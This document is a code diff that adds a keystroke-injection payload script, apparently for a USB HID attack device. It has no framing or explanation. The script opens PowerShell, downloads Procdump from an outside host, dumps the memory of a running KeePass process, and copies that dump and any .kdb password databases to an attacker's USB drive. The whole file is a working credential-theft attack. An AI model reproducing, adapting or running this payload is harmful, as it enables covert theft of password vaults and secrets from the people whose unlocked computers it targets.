@@ -1,0 +1,25 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri https://live.sysinternals.com/Procdump.exe -OutFile C:\Windows\Temp\Procdump.exe
+ENTER
+DELAY 500
+STRING C:\Windows\Temp\Procdump.exe -accepteula -ma keepass C:\Windows\Temp\keedump.dmp
+ENTER
+DELAY 300
+STRING $usbDrive = Get-WmiObject -Class Win32_Volume | Where-Object {$_.Label -eq 'DRIVE' -and $_.DriveType -eq 2}
+ENTER
+DELAY 200
+STRING Get-ChildItem -Filter '*.kdb' -Recurse | Copy-Item -Destination $($usbDrive.DriveLetter)
+ENTER
+DELAY 200
+STRING cd C:\Windows\Temp\
+ENTER
+DELAY 200
+STRING Copy-Item keedump.dmp -Destination $($usbDrive.DriveLetter)
+ENTER
+
+
